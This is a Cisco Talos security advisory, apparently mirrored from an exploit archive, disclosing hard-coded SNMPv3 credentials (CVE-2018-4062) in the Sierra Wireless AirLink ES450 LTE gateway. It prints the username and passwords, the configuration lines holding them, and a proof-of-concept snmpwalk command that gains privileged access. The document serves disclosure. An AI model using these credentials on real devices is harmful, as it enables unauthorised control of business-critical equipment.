@@ -1,0 +1,97 @@
+id: 32612
+date: 04/29/2019
+title: Sierra Wireless AirLink ES450 SNMPD Hard-Coded Credentials Vulnerability
+author: Cisco Talos
+cves: CVE-2018-4062
+
+Sierra Wireless AirLink ES450 SNMPD hard-coded credentials vulnerability
+
+CVE Number
+CVE-2018-4062
+
+Summary
+
+A hard-coded credentials vulnerability exists in the snmpd function of the Sierra Wireless AirLink ES450 FW 4.9.3. Activating snmpd outside of the WebUI can cause the activation of the hard-coded credentials, resulting in a hard-coded, in the exposure of a privileged user. An attacker can activate snmpd without any configuration changes to trigger this vulnerability.
+
+Tested Versions
+
+Sierra Wireless AirLink ES450 FW 4.9.3
+
+Product URLs
+
+https://www.sierrawireless.com/products-and-solutions/routers-gateways/es450/
+CVSSv3 Score
+
+7.7 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H
+CWE
+
+CWE-798: Use of Hard-coded Credentials
+
+
+Details
+
+Sierra Wireless manufactures wireless communications equipment. They provide embedded solutions and wireless hardware solutions, including both the ES450 and GX450 devices. The AirLink ES450 is an LTE gateway designed for distributed enterprise. The ES450 is typically seen connecting point-of-sale devices, remote SCADA equipment, or other business-critical equipment. The AirLink ES450 also provides a terminal server for remote out-of-band administration.
+
+Hard-coded credentials of sierra:12345678:abcdefgh are left in the snmpd.conf files for SNMP v3. This hard-coded user is active if snmpd is executed from outside of the web user interface. The sierra user has read-write privileges for the device.
+
+snmpwalk -v3 -u sierra -l authPriv -a MD5 -A 12345678 -x DES -X abcdefgh 192.168.13.31 -e 80001f8880e8e6831c32486858
+
+This command performs a privileged snmpwalk of the device's MIB.
+
+The configuration files that are responsible for these hard-coded credentials are show below.
+
+/usr/local/share/snmp/snmpd.conf
+
+ ###########################################################################
+ #
+ # snmpd.conf
+ #
+ #   - created by the snmpconf configuration program
+ #
+ ###########################################################################
+ # SECTION: Access Control Setup
+ #
+ #   This section defines who is    allowed to talk to your running
+ #   snmp agent.
+
+ # rwuser: a SNMPv3 read-write      user
+ #   arguments:  user [noauth| auth|priv] [restriction_oid]
+
+ # rwuser  sierra priv 
+ rocommunity public
+
+ ... truncated for brevity
+
+ sysservices 12
+
+ rwuser sierra
+
+/var/net-snmp/snmpd.conf
+
+ createUser sierra MD5 "12345678" DES "abcdefgh"
+
+This vulnerability was discovered and tested using the AirLink ES450. This vulnerability most likely also affects the AirLink GX450 product as well.
+Exploit Proof of Concept
+
+Start /usr/local/sbin/snmpd -f this can be done using other exploits, or via the root shell.
+
+Execute snmpwalk -v3 -u sierra -l authPriv -a MD5 -A 12345678 -x DES -X abcdefgh 192.168.13.31 -e 80001f8880e8e6831c32486858 for a full snmpwalk of the device
+
+Note: This will not work if SNMP is activated through the WebUI as depending on the version that you activate, one of the two files are overwritten during configuration.
+
+
+Timeline
+
+2018-12-14 - Vendor disclosure
+2018-12-17 - Vendor acknowledged
+2019-01-08 - Discussion to review vendor's analysis of issues
+2019-03-26 - Vendor established timelines for fix/public disclosure
+2019-04-20 - Talos provided revised CVSS score on TALOS-2018-0746, TALOS-2018-0751, TALOS-2018-0752, TALOS-2018-0755, and TALOS-2018-0756
+2019-04-25 - Public Release
+
+
+Credit
+
+Discovered by Carl Hurd of Cisco Talos.
+
+#  0day.today [2023-03-26]  #
